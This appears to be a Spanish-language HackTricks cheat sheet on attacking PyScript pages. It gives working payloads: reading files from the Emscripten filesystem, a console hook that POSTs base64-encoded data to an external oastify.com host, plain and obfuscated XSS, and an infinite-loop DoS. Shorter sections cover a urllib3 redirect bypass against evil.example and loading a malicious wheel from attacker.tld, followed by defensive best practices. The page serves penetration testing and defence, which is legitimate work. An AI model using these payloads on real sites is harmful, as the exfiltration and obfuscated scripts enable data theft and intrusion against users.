# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Guía de Pentesting de PyScript

PyScript es un nuevo framework desarrollado para integrar Python en HTML, por lo que puede utilizarse junto con HTML. En esta cheat sheet, encontrarás cómo utilizar PyScript para tus propósitos de penetration testing.

### Volcando / Recuperando archivos del sistema de archivos de memoria virtual de Emscripten:

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Código:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Resultado:

![Guía de Pentesting de PyScript - Volcando / recuperando archivos del sistema de archivos de memoria virtual de Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Exfiltración de datos OOB del sistema de archivos de memoria virtual de Emscripten (monitorización de la consola)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`<sup>[[3]](#references)</sup>\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Resultado:

![Dumping / Retrieving files from the Emscripten virtual memory filesystem - OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinario)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Resultado:

![Exfiltración de datos OOB del sistema de archivos de memoria virtual de Emscripten (monitorización de la consola) - Cross Site Scripting (Ordinario): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Código:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Resultado:

![Cross Site Scripting (Ordinary) - Cross Site Scripting (Python Obfuscated): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Código:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Resultado:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): DoS attack (Infinity loop)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS attack (Infinity loop)

Código:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Resultado:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (Infinity loop):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nuevas vulnerabilidades y técnicas (2023-2025)

### Server-Side Request Forgery via uncontrolled redirects (CVE-2025-50182)

`urllib3 < 2.5.0` ignora los parámetros `redirect` y `retries` cuando se ejecuta **dentro del runtime de Pyodide** incluido con PyScript. Cuando un atacante puede influir en las URL de destino, puede forzar al código Python a seguir redirecciones entre dominios incluso cuando el desarrollador las ha deshabilitado explícitamente, lo que en la práctica permite evadir la lógica anti-SSRF.<sup>[[1]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Parcheado en `urllib3 2.5.0`: actualiza el paquete en tu imagen de PyScript o fija una versión segura en `packages = ["urllib3>=2.5.0"]`. Consulta la entrada oficial de CVE para obtener más detalles.

### Carga arbitraria de paquetes y ataques a la cadena de suministro

Dado que PyScript permite URLs arbitrarias en la lista `packages`, un actor malicioso que pueda modificar o inyectar la configuración puede ejecutar **Python completamente arbitrario** en el navegador de la víctima:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Solo se requieren wheels de pure-Python; no es necesario ningún paso de compilación de WebAssembly.* Asegúrate de que la configuración no esté controlada por el usuario y aloja wheels de confianza en tu propio dominio con HTTPS y hashes SRI.

### Cambios en la sanitización de la salida (2023+)

* `print()` sigue inyectando HTML sin procesar y, por tanto, es vulnerable a XSS (ejemplos anteriores).
* El helper más reciente `display()` **escapa el HTML de forma predeterminada**; el markup sin procesar debe envolverse en `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Este comportamiento se introdujo en 2023 y está documentado en la guía oficial de Built-ins. Usa `display()` para entradas no confiables y evita llamar directamente a `print()`.<sup>[[2]](#references)</sup>

---

## Mejores prácticas defensivas

* **Mantén los paquetes actualizados** – actualiza a `urllib3 >= 2.5.0` y reconstruye regularmente los wheels que se distribuyen con el sitio.
* **Restringe las fuentes de paquetes** – referencia únicamente nombres de PyPI o URLs de mismo origen, idealmente protegidas con Sub-resource Integrity (SRI).
* **Refuerza la Content Security Policy** – prohíbe JavaScript inline (`script-src 'self' 'sha256-…'`) para que los bloques `<script>` inyectados no puedan ejecutarse.
* **Prohíbe las etiquetas `<py-script>` / `<script type="py">` proporcionadas por el usuario** – sanitiza el HTML en el servidor antes de devolvérselo a otros usuarios.
* **Aísla los workers** – si no necesitas acceso síncrono al DOM desde los workers, habilita el flag `sync_main_only` para evitar los requisitos de cabecera de `SharedArrayBuffer`.

## Referencias

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Documentación de PyScript Built-ins – `display` y `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - The Art of Vulnerability Chaining (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)

{{#include ../../banners/hacktricks-training.md}}
